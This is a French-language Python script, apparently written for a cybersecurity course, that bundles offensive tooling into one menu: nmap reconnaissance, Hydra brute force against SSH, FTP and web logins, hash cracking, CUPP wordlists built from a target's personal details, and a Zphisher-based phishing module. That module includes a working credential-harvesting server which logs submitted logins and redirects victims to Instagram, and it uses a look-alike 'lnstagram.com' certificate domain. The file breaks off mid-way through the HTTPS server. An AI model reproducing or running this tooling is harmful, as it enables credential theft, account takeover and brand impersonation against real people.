#!/usr/bin/env python3
"""
CyberKit — Boîte à outils offensive TP Cybersécurité
Couvre : Reconnaissance (TP1), Brute Force (TP2), Phishing (TP3), MITM (TP4)
"""

import subprocess
import os
import sys
import signal
import shutil
import time
import re
import json
from pathlib import Path

# ============================================================
# COULEURS & STYLES
# ============================================================
class C:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"
    BG_RED = "\033[41m"
    BG_GREEN = "\033[42m"
    BG_BLUE = "\033[44m"

# ============================================================
# ÉTAT GLOBAL
# ============================================================
class State:
    """Stocke l'état de la session pour partager entre modules."""
    iface = "eth0"
    my_ip = None
    gateway = None
    target_ip = None
    target_mac = None
    subnet = None
    scan_results = {}
    open_ports = {}
    processes = []  # PIDs des processus lancés
    zphisher_path = None
    phish_www = None
    cert_path = "/tmp/cyberkit_cert.pem"
    key_path = "/tmp/cyberkit_key.pem"
    creds_file = "/tmp/cyberkit_creds.txt"
    spoof_domain = "lnstagram.com"
    forwarding_was_enabled = False
    cupp_path = None
    wordlists = {}  # nom -> chemin des wordlists générées

state = State()

# ============================================================
# UTILITAIRES
# ============================================================
def banner():
    os.system("clear")
    print(f"""
   {C.YELLOW}                                              ·  ·
   {C.YELLOW}                                           · zzZ ·
   {C.YELLOW}                                         ·  zzZ ·
   {C.YELLOW}                                       · zZ  ·{C.RESET}
   {C.GREEN}           ╭───────────────────────╮  {C.YELLOW} ~{C.RESET}
   {C.GREEN}          ╱{C.MAGENTA}  ▄▄     ▄▄▄▄▄▄▄▄▄▄▄▄ {C.GREEN} ╲____{C.RESET}
   {C.GREEN}    ╔════{C.GREEN}╱{C.MAGENTA}  █{C.WHITE}◡{C.MAGENTA}█   █{C.WHITE}◡{C.MAGENTA}█  ▀▀▀▀▀▀▀▀ {C.GREEN}     ╲{C.RESET}
   {C.CYAN}    ║   {C.GREEN}│{C.MAGENTA}   ▀▀ {C.RED}△{C.MAGENTA} ▀▀    {C.MAGENTA}▄▄▄▄     {C.GREEN}     │{C.RESET}
   {C.CYAN}   ═╬═  {C.GREEN}│{C.MAGENTA}      {C.RED}╰═╯{C.MAGENTA}      ██████▄▄  {C.GREEN}   │{C.RESET}
   {C.CYAN}    ║   {C.GREEN} ╲{C.MAGENTA}   ~~~~~~~~~~  ████████{C.GREEN}  ╱{C.RESET}
   {C.GREEN}    ╚════{C.GREEN}╲{C.MAGENTA}    ╲________╱  ██████{C.GREEN}╱╱{C.RESET}
   {C.GREEN}          ╲{C.BLUE}═══╗{C.GREEN}________{C.BLUE}╔═══{C.GREEN}╱{C.RESET}
   {C.GREEN}           ╲__{C.BLUE}▓▓▓{C.GREEN}│{C.DIM}....__{C.GREEN}│{C.BLUE}▓▓▓{C.GREEN}_╱{C.RESET}
   {C.BLUE}              ▓▓▓▓▓    ▓▓▓▓▓{C.RESET}
   {C.BLUE}              ░▓▓▓░    ░▓▓▓░{C.RESET}
   {C.BLUE}              ▀████    ████▀{C.RESET}
   {C.DIM}            (too tired to hack manually){C.RESET}

   {C.RED}{C.BOLD}   ██╗      █████╗ ███████╗██╗   ██╗██╗  ██╗██╗████████╗
   ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██║ ██╔╝██║╚══██╔══╝
   ██║     ███████║  ███╔╝  ╚████╔╝ █████╔╝ ██║   ██║
   ██║     ██╔══██║ ███╔╝    ╚██╔╝  ██╔═██╗ ██║   ██║
   ███████╗██║  ██║███████╗   ██║   ██║  ██╗██║   ██║
   ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝   ╚═╝{C.RESET}
   {C.DIM}════════════════════════════════════════════════════════════{C.RESET}
   {C.YELLOW}     Pentest Toolkit — Why do it yourself?{C.RESET}
   {C.DIM}     Reconnaissance • Brute Force • Phishing • MITM{C.RESET}
   {C.DIM}════════════════════════════════════════════════════════════{C.RESET}
""")


def print_status(msg):
    print(f"  {C.BLUE}[*]{C.RESET} {msg}")

def print_success(msg):
    print(f"  {C.GREEN}[✓]{C.RESET} {msg}")

def print_error(msg):
    print(f"  {C.RED}[✗]{C.RESET} {msg}")

def print_warning(msg):
    print(f"  {C.YELLOW}[!]{C.RESET} {msg}")

def print_info(msg):
    print(f"  {C.CYAN}[i]{C.RESET} {msg}")

def print_cred(msg):
    print(f"  {C.RED}{C.BOLD}[🔑]{C.RESET} {C.RED}{msg}{C.RESET}")

def section_header(title):
    w = 60
    print()
    print(f"  {C.CYAN}{'━' * w}{C.RESET}")
    print(f"  {C.CYAN}{C.BOLD}  {title}{C.RESET}")
    print(f"  {C.CYAN}{'━' * w}{C.RESET}")
    print()

def menu_header(title):
    print()
    print(f"  {C.MAGENTA}{C.BOLD}╔{'═' * 56}╗{C.RESET}")
    print(f"  {C.MAGENTA}{C.BOLD}║{C.RESET}  {C.WHITE}{C.BOLD}{title:<54}{C.RESET}{C.MAGENTA}{C.BOLD}║{C.RESET}")
    print(f"  {C.MAGENTA}{C.BOLD}╚{'═' * 56}╝{C.RESET}")
    print()

def menu_option(num, text, color=C.WHITE):
    print(f"    {C.GREEN}[{num}]{C.RESET} {color}{text}{C.RESET}")

def menu_back():
    print()
    print(f"    {C.YELLOW}[0]{C.RESET} {C.DIM}← Retour{C.RESET}")

def menu_quit():
    print(f"    {C.RED}[q]{C.RESET} {C.DIM}Quitter CyberKit{C.RESET}")

def get_choice(prompt="  Choix"):
    print()
    try:
        return input(f"  {C.CYAN}❯{C.RESET} {prompt} : ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        return "q"

def get_input(prompt, default=None):
    try:
        suffix = f" [{C.DIM}{default}{C.RESET}]" if default else ""
        val = input(f"  {C.CYAN}❯{C.RESET} {prompt}{suffix} : ").strip()
        return val if val else default
    except (KeyboardInterrupt, EOFError):
        return default

def pause():
    print()
    input(f"  {C.DIM}Appuie sur Entrée pour continuer...{C.RESET}")

def run(cmd, capture=True, timeout=120):
    """Exécute une commande shell."""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=capture, text=True, timeout=timeout)
        return r.stdout.strip() if capture else None
    except subprocess.TimeoutExpired:
        print_error(f"Timeout : {cmd}")
        return None
    except Exception as e:
        print_error(f"Erreur : {e}")
        return None

def run_bg(cmd):
    """Lance une commande en arrière-plan, retourne le PID."""
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    state.processes.append(p)
    return p.pid

def check_root():
    if os.geteuid() != 0:
        print_error("CyberKit doit être lancé en root (sudo)")
        print_info("Usage : sudo python3 cyberkit.py")
        sys.exit(1)

def check_tool(name):
    return shutil.which(name) is not None

def detect_network():
    """Détecte l'IP, la gateway et le subnet."""
    out = run(f"ip -4 addr show {state.iface}")
    if out:
        m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', out)
        if m:
            state.my_ip = m.group(1)
            prefix = m.group(2)
            parts = state.my_ip.split(".")
            state.subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/{prefix}"

    gw = run("ip route | grep default | awk '{print $3}'")
    if gw:
        state.gateway = gw

def find_cupp():
    """Cherche CUPP sur le système."""
    common_paths = [
        os.path.expanduser("~/Documents/cupp"),
        os.path.expanduser("~/cupp"),
        "/opt/cupp",
        os.path.expanduser("~/Desktop/cupp"),
        os.path.expanduser("~/tools/cupp"),
    ]
    # Cherche aussi via locate/find
    which = run("which cupp cupp.py cupp3 2>/dev/null")
    if which:
        for line in which.split("\n"):
            if line.strip():
                state.cupp_path = line.strip()
                return True

    for p in common_paths:
        if os.path.isdir(p) and os.path.isfile(os.path.join(p, "cupp.py")):
            state.cupp_path = os.path.join(p, "cupp.py")
            return True

    # Recherche récursive dans home
    result = run(f"find {os.path.expanduser('~')} -name 'cupp.py' -type f 2>/dev/null | head -1")
    if result:
        state.cupp_path = result.strip()
        return True

    return False

def find_zphisher():
    """Cherche Zphisher sur le système."""
    common_paths = [
        os.path.expanduser("~/Documents/zphisher"),
        os.path.expanduser("~/zphisher"),
        "/opt/zphisher",
        os.path.expanduser("~/Desktop/zphisher"),
    ]
    for p in common_paths:
        if os.path.isdir(p) and os.path.isfile(os.path.join(p, "zphisher.sh")):
            state.zphisher_path = p
            www = os.path.join(p, ".server", "www")
            if os.path.isdir(www):
                state.phish_www = www
            return True
    return False

def show_state():
    """Affiche l'état actuel de la session."""
    section_header("État de la session")
    print(f"    {C.DIM}Interface     :{C.RESET} {state.iface}")
    print(f"    {C.DIM}IP attaquant  :{C.RESET} {state.my_ip or '—'}")
    print(f"    {C.DIM}Gateway      :{C.RESET} {state.gateway or '—'}")
    print(f"    {C.DIM}Subnet       :{C.RESET} {state.subnet or '—'}")
    print(f"    {C.DIM}Cible        :{C.RESET} {state.target_ip or '—'}")
    print(f"    {C.DIM}Zphisher     :{C.RESET} {state.zphisher_path or 'Non trouvé'}")
    print(f"    {C.DIM}CUPP         :{C.RESET} {state.cupp_path or 'Non trouvé'}")
    print(f"    {C.DIM}Domaine spoof:{C.RESET} {state.spoof_domain}")
    print(f"    {C.DIM}Certificat   :{C.RESET} {'Oui' if os.path.isfile(state.cert_path) else 'Non'}")
    if state.wordlists:
        print(f"    {C.DIM}Wordlists    :{C.RESET} {', '.join(state.wordlists.keys())}")
    if state.processes:
        print(f"    {C.DIM}Processus    :{C.RESET} {len(state.processes)} en cours")

# ============================================================
# MODULE 1 — RECONNAISSANCE (TP1)
# ============================================================
def mod_recon():
    while True:
        banner()
        menu_header("MODULE 1 — RECONNAISSANCE (TP1)")
        menu_option("1", "Scan de découverte réseau (nmap -sn)")
        menu_option("2", "Scan de ports d'une cible (nmap -sV)")
        menu_option("3", "Scan complet + OS detection (nmap -A)")
        menu_option("4", "Scan de vulnérabilités (nmap --script vuln)")
        menu_option("5", "Scan UDP (nmap -sU top 20)")
        menu_option("6", "Scan furtif SYN (nmap -sS)")
        menu_option("7", "Changer l'interface réseau")
        menu_back()
        menu_quit()

        c = get_choice()

        if c == "0":
            return
        elif c == "q":
            cleanup_and_exit()

        elif c == "1":
            section_header("Scan de découverte réseau")
            subnet = get_input("Subnet à scanner", state.subnet)
            if not subnet:
                print_error("Pas de subnet détecté")
                pause()
                continue
            print_status(f"Scan en cours sur {subnet}...")
            print()
            run(f"nmap -sn {subnet}", capture=False)
            pause()

        elif c == "2":
            section_header("Scan de ports + versions")
            target = get_input("IP cible", state.target_ip)
            if not target:
                print_error("Pas de cible définie")
                pause()
                continue
            print_status(f"Scan des ports ouverts sur {target}...")
            print()
            run(f"nmap -sV {target}", capture=False)
            pause()

        elif c == "3":
            section_header("Scan complet (ports + OS + scripts)")
            target = get_input("IP cible", state.target_ip)
            if not target:
                print_error("Pas de cible définie")
                pause()
                continue
            print_status(f"Scan complet sur {target} (peut prendre du temps)...")
            print()
            run(f"nmap -A {target}", capture=False, timeout=300)
            pause()

        elif c == "4":
            section_header("Scan de vulnérabilités")
            target = get_input("IP cible", state.target_ip)
            if not target:
                print_error("Pas de cible définie")
                pause()
                continue
            print_status(f"Scan de vulnérabilités sur {target}...")
            print()
            run(f"nmap --script vuln {target}", capture=False, timeout=300)
            pause()

        elif c == "5":
            section_header("Scan UDP (top 20 ports)")
            target = get_input("IP cible", state.target_ip)
            if not target:
                print_error("Pas de cible définie")
                pause()
                continue
            print_status(f"Scan UDP sur {target}...")
            print()
            run(f"nmap -sU --top-ports 20 {target}", capture=False, timeout=300)
            pause()

        elif c == "6":
            section_header("Scan furtif SYN")
            target = get_input("IP cible", state.target_ip)
            if not target:
                print_error("Pas de cible définie")
                pause()
                continue
            print_status(f"Scan SYN furtif sur {target}...")
            print()
            run(f"nmap -sS {target}", capture=False)
            pause()

        elif c == "7":
            new_iface = get_input("Nouvelle interface", state.iface)
            state.iface = new_iface
            detect_network()
            print_success(f"Interface changée : {state.iface} ({state.my_ip})")
            pause()


# ============================================================
# MODULE 2 — BRUTE FORCE (TP2)
# ============================================================
def select_wordlist():
    """Menu de sélection de wordlist — retourne le chemin ou None."""
    print()
    print(f"    {C.CYAN}╭─ Choix de la wordlist ──────────────────────────╮{C.RESET}")
    print(f"    {C.CYAN}│{C.RESET}                                                 {C.CYAN}│{C.RESET}")
    print(f"    {C.CYAN}│{C.RESET}  {C.GREEN}[1]{C.RESET} rockyou.txt (générique, 14M mots de passe) {C.CYAN}│{C.RESET}")
    print(f"    {C.CYAN}│{C.RESET}  {C.GREEN}[2]{C.RESET} Wordlist CUPP (profiling OSINT d'une cible) {C.CYAN}│{C.RESET}")
    print(f"    {C.CYAN}│{C.RESET}  {C.GREEN}[3]{C.RESET} Wordlist crunch (combinaisons brutes)       {C.CYAN}│{C.RESET}")
    print(f"    {C.CYAN}│{C.RESET}  {C.GREEN}[4]{C.RESET} Wordlist déjà générée (cette session)       {C.CYAN}│{C.RESET}")
    print(f"    {C.CYAN}│{C.RESET}  {C.GREEN}[5]{C.RESET} Chemin personnalisé                         {C.CYAN}│{C.RESET}")
    print(f"    {C.CYAN}│{C.RESET}                                                 {C.CYAN}│{C.RESET}")
    print(f"    {C.CYAN}╰─────────────────────────────────────────────────╯{C.RESET}")

    wc = get_choice("Wordlist")

    if wc == "1":
        # Chercher rockyou
        paths = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz",
        ]
        for p in paths:
            if os.path.isfile(p):
                if p.endswith(".gz"):
                    print_status("rockyou.txt.gz trouvé, décompression...")
                    run(f"gunzip -k {p}")
                    return p[:-3]
                return p
        print_error("rockyou.txt non trouvé dans /usr/share/wordlists/")
        custom = get_input("Chemin vers rockyou.txt")
        return custom

    elif wc == "2":
        return generate_cupp_wordlist()

    elif wc == "3":
        return generate_crunch_wordlist()

    elif wc == "4":
        if not state.wordlists:
            print_warning("Aucune wordlist générée dans cette session")
            return select_wordlist()
        print()
        for i, (name, path) in enumerate(state.wordlists.items(), 1):
            size = os.path.getsize(path) / 1024 if os.path.isfile(path) else 0
            print(f"    {C.GREEN}[{i}]{C.RESET} {name} — {path} ({size:.0f} KB)")
        idx = get_input("Numéro")
        try:
            return list(state.wordlists.values())[int(idx) - 1]
        except (ValueError, IndexError):
            print_error("Choix invalide")
            return None

    elif wc == "5":
        return get_input("Chemin vers la wordlist")

    return None


def generate_cupp_wordlist():
    """Lance CUPP pour générer une wordlist basée sur le profiling OSINT."""
    section_header("CUPP — Profiling OSINT → Wordlist")

    if not state.cupp_path:
        print_warning("CUPP non trouvé sur le système. Recherche en cours...")
        if not find_cupp():
            print_error("CUPP introuvable.")
            print()
            print_info("Options :")
            print(f"    {C.GREEN}[1]{C.RESET} Installer CUPP automatiquement")
            print(f"    {C.GREEN}[2]{C.RESET} Indiquer le chemin manuellement")
            print(f"    {C.GREEN}[0]{C.RESET} Annuler")
            ic = get_choice()
            if ic == "1":
                install_dir = os.path.expanduser("~/Documents/cupp")
                print_status(f"Clonage de CUPP dans {install_dir}...")
                result = run(f"git clone https://github.com/Mebus/cupp.git {install_dir}", timeout=30)
                cupp_file = os.path.join(install_dir, "cupp.py")
                if os.path.isfile(cupp_file):
                    state.cupp_path = cupp_file
                    print_success(f"CUPP installé : {state.cupp_path}")
                else:
                    print_error("Échec de l'installation")
                    return None
            elif ic == "2":
                path = get_input("Chemin vers cupp.py")
                if path and os.path.isfile(path):
                    state.cupp_path = path
                else:
                    print_error("Fichier non trouvé")
                    return None
            else:
                return None

    print_success(f"CUPP trouvé : {state.cupp_path}")
    print()

    print(f"    {C.CYAN}╭─ Mode CUPP ──────────────────────────────────────╮{C.RESET}")
    print(f"    {C.CYAN}│{C.RESET}                                                  {C.CYAN}│{C.RESET}")
    print(f"    {C.CYAN}│{C.RESET}  {C.GREEN}[1]{C.RESET} Interactif (questions sur la cible)          {C.CYAN}│{C.RESET}")
    print(f"    {C.CYAN}│{C.RESET}  {C.GREEN}[2]{C.RESET} Remplissage rapide (nom + infos clés)        {C.CYAN}│{C.RESET}")
    print(f"    {C.CYAN}│{C.RESET}                                                  {C.CYAN}│{C.RESET}")
    print(f"    {C.CYAN}╰──────────────────────────────────────────────────╯{C.RESET}")

    mode = get_choice("Mode")

    cupp_dir = os.path.dirname(state.cupp_path)

    if mode == "1":
        print()
        print_info("CUPP va te poser des questions sur la cible (nom, date de naissance,")
        print_info("partenaire, animal, entreprise, mots-clés...). Plus tu en sais, mieux c'est.")
        print_info("Laisse vide les champs que tu ne connais pas.")
        print()
        print_warning("CUPP prend le contrôle du terminal. La wordlist sera générée dans son dossier.")
        pause()
        os.system(f"cd {cupp_dir} && python3 {state.cupp_path} -i")

    elif mode == "2":
        print()
        print_info("Remplissage rapide — entre les infos OSINT de la cible :")
        print()

        first = get_input("Prénom de la cible")
        last = get_input("Nom de famille", "")
        nick = get_input("Surnom / pseudo", "")
        birth = get_input("Date de naissance (DDMMYYYY)", "")
        partner = get_input("Nom du/de la partenaire", "")
        partner_nick = get_input("Surnom du/de la partenaire", "")
        partner_birth = get_input("Date naissance partenaire (DDMMYYYY)", "")
        pet = get_input("Nom de l'animal de compagnie", "")
        company = get_input("Nom de l'entreprise", "")
        keywords = get_input("Mots-clés (séparés par virgule, ex: running,football,2018)", "")

        if not first:
            print_error("Au minimum le prénom est requis")
            return None

        # Construire le fichier de réponses pour cupp -i (mode non-interactif simulé)
        answers = f"""{first}
{last}
{nick}
{birth}
{partner}
{partner_nick}
{partner_birth}

{pet}


{company}

{'Y' if keywords else 'N'}
{keywords}
N
N
"""
        answers_file = "/tmp/cupp_answers.txt"
        with open(answers_file, "w") as f:
            f.write(answers)

        target_name = first.lower()
        print()
        print_status(f"Génération de la wordlist pour « {first} {last} »...")
        os.system(f"cd {cupp_dir} && python3 {state.cupp_path} -i < {answers_file}")
    else:
        return None

    # Chercher la wordlist générée (CUPP crée un fichier .txt dans son dossier)
    print()
    print_status("Recherche de la wordlist générée...")

    # CUPP nomme le fichier prénom.txt
    generated = run(f"ls -t {cupp_dir}/*.txt 2>/dev/null | head -5")
    if generated:
        files = [f.strip() for f in generated.split("\n") if f.strip()]
        if len(files) == 1:
            wl_path = files[0]
        else:
            print()
            print_info("Wordlists trouvées dans le dossier CUPP :")
            for i, f in enumerate(files, 1):
                fname = os.path.basename(f)
                size = os.path.getsize(f) / 1024 if os.path.isfile(f) else 0
                lines = run(f"wc -l < {f}")
                print(f"      {C.GREEN}[{i}]{C.RESET} {fname} ({lines} mots, {size:.0f} KB)")
            idx = get_input("Laquelle utiliser ?", "1")
            try:
                wl_path = files[int(idx) - 1]
            except (ValueError, IndexError):
                wl_path = files[0]

        wl_name = os.path.basename(wl_path)
        lines = run(f"wc -l < {wl_path}")
        print_success(f"Wordlist : {wl_path} ({lines} combinaisons)")
        state.wordlists[wl_name] = wl_path
        return wl_path
    else:
        print_error("Aucune wordlist trouvée dans le dossier CUPP")
        manual = get_input("Chemin vers la wordlist générée")
        return manual


def generate_crunch_wordlist():
    """Génère une wordlist avec crunch."""
    section_header("Crunch — Génération par combinaisons")

    if not check_tool("crunch"):
        print_error("crunch n'est pas installé")
        print_info("sudo apt install crunch")
        return None

    print_info("Crunch génère toutes les combinaisons possibles d'un charset donné.")
    print_info("Attention : peut produire des fichiers très volumineux !")
    print()

    min_len = get_input("Longueur min", "6")
    max_len = get_input("Longueur max", "8")

    print()
    print(f"    {C.CYAN}Charsets prédéfinis :{C.RESET}")
    print(f"    {C.GREEN}[1]{C.RESET} Lettres minuscules (a-z)")
    print(f"    {C.GREEN}[2]{C.RESET} Lettres + chiffres (a-z0-9)")
    print(f"    {C.GREEN}[3]{C.RESET} Lettres min/maj + chiffres")
    print(f"    {C.GREEN}[4]{C.RESET} Tout (lettres + chiffres + spéciaux)")
    print(f"    {C.GREEN}[5]{C.RESET} Charset personnalisé")

    cc = get_choice("Charset")
    charsets = {
        "1": "abcdefghijklmnopqrstuvwxyz",
        "2": "abcdefghijklmnopqrstuvwxyz0123456789",
        "3": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "4": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%",
    }
    if cc == "5":
        charset = get_input("Charset personnalisé")
    else:
        charset = charsets.get(cc, charsets["2"])

    output = get_input("Fichier de sortie", "/tmp/crunch_wordlist.txt")
    cmd = f"crunch {min_len} {max_len} {charset} -o {output}"

    print()
    print_status(f"Commande : {cmd}")
    confirm = get_input("Lancer ? (o/n)", "o")
    if confirm == "o":
        run(cmd, capture=False, timeout=300)
        if os.path.isfile(output):
            size = os.path.getsize(output) / (1024 * 1024)
            lines = run(f"wc -l < {output}")
            print_success(f"Wordlist : {output} ({lines} mots, {size:.1f} MB)")
            name = os.path.basename(output)
            state.wordlists[name] = output
            return output
    return None


def mod_bruteforce():
    while True:
        banner()
        menu_header("MODULE 2 — BRUTE FORCE (TP2)")

        # Status wordlists
        cupp_status = f"{C.GREEN}trouvé{C.RESET}" if state.cupp_path else f"{C.RED}non trouvé{C.RESET}"
        wl_count = len(state.wordlists)
        wl_status = f"{C.GREEN}{wl_count} wordlist(s){C.RESET}" if wl_count else f"{C.DIM}aucune{C.RESET}"

        print(f"    {C.DIM}CUPP : {cupp_status}  |  Wordlists session : {wl_status}{C.RESET}")
        print()

        print(f"    {C.MAGENTA}{C.BOLD}── Wordlists ──{C.RESET}")
        menu_option("1", f"CUPP — Profiling OSINT → wordlist custom  {C.DIM}(recommandé){C.RESET}")
        menu_option("2", f"Crunch — Génération par combinaisons brutes")
        menu_option("3", f"Voir les wordlists de cette session")
        print()
        print(f"    {C.MAGENTA}{C.BOLD}── Attaque ──{C.RESET}")
        menu_option("4", "Hydra — Brute force SSH")
        menu_option("5", "Hydra — Brute force FTP")
        menu_option("6", "Hydra — Brute force HTTP form")
        menu_option("7", "Hydra — Brute force custom service")
        print()
        print(f"    {C.MAGENTA}{C.BOLD}── Crack ──{C.RESET}")
        menu_option("8", "Hashcat — Crack de hash")
        menu_option("9", "John the Ripper — Crack de hash")
        menu_back()
        menu_quit()

        c = get_choice()

        if c == "0":
            return
        elif c == "q":
            cleanup_and_exit()

        elif c == "1":
            wl = generate_cupp_wordlist()
            if wl:
                print_success(f"Wordlist prête : {wl}")
            pause()

        elif c == "2":
            wl = generate_crunch_wordlist()
            if wl:
                print_success(f"Wordlist prête : {wl}")
            pause()

        elif c == "3":
            section_header("Wordlists de cette session")
            if not state.wordlists:
                print_info("Aucune wordlist générée. Utilise CUPP (1) ou Crunch (2).")
            else:
                for name, path in state.wordlists.items():
                    if os.path.isfile(path):
                        size = os.path.getsize(path) / 1024
                        lines = run(f"wc -l < {path}")
                        print(f"    {C.GREEN}●{C.RESET} {name}")
                        print(f"      {C.DIM}Chemin : {path}{C.RESET}")
                        print(f"      {C.DIM}Taille : {size:.0f} KB | {lines} mots{C.RESET}")
                        print()
            pause()

        elif c in ("4", "5", "6", "7"):
            services = {"4": "ssh", "5": "ftp", "6": "http-post-form", "7": "custom"}
            svc = services[c]

            section_header(f"Hydra — Brute force {svc.upper()}")

            if not check_tool("hydra"):
                print_error("Hydra n'est pas installé")
                print_info("sudo apt install hydra")
                pause()
                continue

            target = get_input("IP cible", state.target_ip)
            if not target:
                print_error("Pas de cible")
                pause()
                continue

            if svc == "custom":
                svc = get_input("Service (ssh/ftp/rdp/smb/telnet/mysql...)")
                if not svc:
                    continue

            mode = get_input("Mode : (1) User+Wordlist  (2) Userlist+Wordlist", "1")

            if mode == "1":
                user = get_input("Nom d'utilisateur")
                if not user:
                    continue
                print()
                print_info("Sélectionne la wordlist pour le brute force :")
                wordlist = select_wordlist()
                if not wordlist:
                    print_error("Pas de wordlist sélectionnée")
                    pause()
                    continue

                if svc == "http-post-form":
                    url = get_input("URL du form (ex: /login.php)")
                    params = get_input("Params (ex: user=^USER^&pass=^PASS^:F=incorrect)")
                    cmd = f'hydra -l {user} -P {wordlist} {target} {svc} "{url}:{params}"'
                else:
                    port = get_input("Port (laisser vide = défaut)", "")
                    port_flag = f"-s {port}" if port else ""
                    cmd = f"hydra -l {user} -P {wordlist} {port_flag} {target} {svc}"
            else:
                userlist = get_input("Chemin liste d'utilisateurs")
                if not userlist:
                    continue
                print()
                print_info("Sélectionne la wordlist pour le brute force :")
                wordlist = select_wordlist()
                if not wordlist:
                    print_error("Pas de wordlist sélectionnée")
                    pause()
                    continue

                port = get_input("Port (laisser vide = défaut)", "")
                port_flag = f"-s {port}" if port else ""
                cmd = f"hydra -L {userlist} -P {wordlist} {port_flag} {target} {svc}"

            threads = get_input("Nombre de threads", "16")
            cmd += f" -t {threads} -V"

            print()
            print_status(f"Commande : {cmd}")
            print()
            confirm = get_input("Lancer ? (o/n)", "o")
            if confirm == "o":
                run(cmd, capture=False, timeout=600)
            pause()

        elif c == "8":
            section_header("Hashcat — Crack de hash")
            if not check_tool("hashcat"):
                print_error("Hashcat n'est pas installé")
                pause()
                continue

            hash_file = get_input("Fichier de hash")
            if not hash_file:
                continue

            print_info("Modes courants :")
            print(f"    {C.DIM}0 = MD5          100 = SHA1        1000 = NTLM{C.RESET}")
            print(f"    {C.DIM}1800 = SHA-512    13400 = KeePass   2500 = WPA{C.RESET}")
            print(f"    {C.DIM}3200 = bcrypt     1400 = SHA-256    500 = MD5crypt{C.RESET}")
            hash_mode = get_input("Hash mode", "0")

            print()
            print_info("Sélectionne la wordlist :")
            wordlist = select_wordlist()
            if not wordlist:
                pause()
                continue

            cmd = f"hashcat -m {hash_mode} -a 0 {hash_file} {wordlist} --force"
            print()
            print_status(f"Commande : {cmd}")
            confirm = get_input("Lancer ? (o/n)", "o")
            if confirm == "o":
                run(cmd, capture=False, timeout=600)
            pause()

        elif c == "9":
            section_header("John the Ripper — Crack de hash")
            if not check_tool("john"):
                print_error("John n'est pas installé")
                pause()
                continue

            hash_file = get_input("Fichier de hash")
            fmt = get_input("Format (laisser vide = auto)", "")
            fmt_flag = f"--format={fmt}" if fmt else ""

            print()
            print_info("Sélectionne la wordlist :")
            wordlist = select_wordlist()
            if not wordlist:
                pause()
                continue

            cmd = f"john {fmt_flag} --wordlist={wordlist} {hash_file}"

            print_status(f"Commande : {cmd}")
            confirm = get_input("Lancer ? (o/n)", "o")
            if confirm == "o":
                run(cmd, capture=False, timeout=600)
            pause()


# ============================================================
# MODULE 3 — PHISHING (TP3)
# ============================================================
def mod_phishing():
    while True:
        banner()
        menu_header("MODULE 3 — PHISHING (TP3)")

        zp_status = f"{C.GREEN}trouvé{C.RESET}" if state.zphisher_path else f"{C.RED}non trouvé{C.RESET}"
        www_status = f"{C.GREEN}prêt{C.RESET}" if state.phish_www else f"{C.RED}non détecté{C.RESET}"

        print(f"    {C.DIM}Zphisher : {zp_status}  |  Pages phishing : {www_status}{C.RESET}")
        print()

        menu_option("1", "Lancer Zphisher (interactif)")
        menu_option("2", "Serveur HTTP — page phishing (port 80)")
        menu_option("3", "Serveur HTTPS — page phishing (port 443)")
        menu_option("4", "Générer un certificat SSL auto-signé")
        menu_option("5", "Détecter / changer le chemin Zphisher")
        menu_option("6", "Voir les identifiants capturés")
        menu_back()
        menu_quit()

        c = get_choice()

        if c == "0":
            return
        elif c == "q":
            cleanup_and_exit()

        elif c == "1":
            section_header("Lancement de Zphisher")
            if not state.zphisher_path:
                print_error("Zphisher non trouvé. Utilise l'option 5 pour le localiser.")
                pause()
                continue
            print_status(f"Lancement depuis {state.zphisher_path}...")
            print_warning("Zphisher va prendre le contrôle du terminal. Ctrl+C pour revenir.")
            pause()
            os.system(f"cd {state.zphisher_path} && bash zphisher.sh")
            # Après retour, re-détecter le www
            find_zphisher()

        elif c == "2":
            section_header("Serveur HTTP — Port 80")
            if not state.phish_www:
                print_error("Dossier phishing non trouvé. Lance Zphisher d'abord (option 1).")
                pause()
                continue

            port = get_input("Port", "80")
            print_status(f"Lancement du serveur HTTP sur le port {port}...")
            print_status(f"Dossier : {state.phish_www}")
            print_info(f"Accessible sur : http://{state.my_ip}:{port}")
            print()
            print_warning("Ctrl+C pour arrêter le serveur")
            print()

            server_code = f"""
import http.server, os
class H(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/': self.path = '/login.html'
        return super().do_GET()
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode()
        print(f'\\n\\033[91m[CREDS] {{data}}\\033[0m\\n')
        with open('{state.creds_file}', 'a') as f:
            import datetime
            f.write(f'[{{datetime.datetime.now()}}] {{data}}\\n')
        self.send_response(302)
        self.send_header('Location', 'https://www.instagram.com')
        self.end_headers()
os.chdir('{state.phish_www}')
s = http.server.HTTPServer(('0.0.0.0', {port}), H)
print('Serveur HTTP actif sur le port {port}...')
s.serve_forever()
"""
            try:
                run(f"python3 -c \"{server_code}\"", capture=False, timeout=3600)
            except KeyboardInterrupt:
                pass

        elif c == "3":
            section_header("Serveur HTTPS — Port 443")
            if not state.phish_www:
                print_error("Dossier phishing non trouvé. Lance Zphisher d'abord (option 1).")
                pause()
                continue
            if not os.path.isfile(state.cert_path):
                print_warning("Pas de certificat trouvé. Génération automatique...")
                domain = get_input("Domaine pour le certificat", state.spoof_domain)
                gen_cert(domain)

            print_status(f"Lancement du serveur HTTPS sur le port 443...")
            print_status(f"Dossier : {state.phish_www}")
            print_status(f"Certificat : {state.cert_path}")
            print_info(f"Accessible sur : https://{state.my_ip}")
            print()
            print_warning("Ctrl+C pour arrêter le serveur")
            print()

            server_code = f"""
import http.server, ssl, os, datetime
class H(http.server.SimpleHTTPRequestHandler):
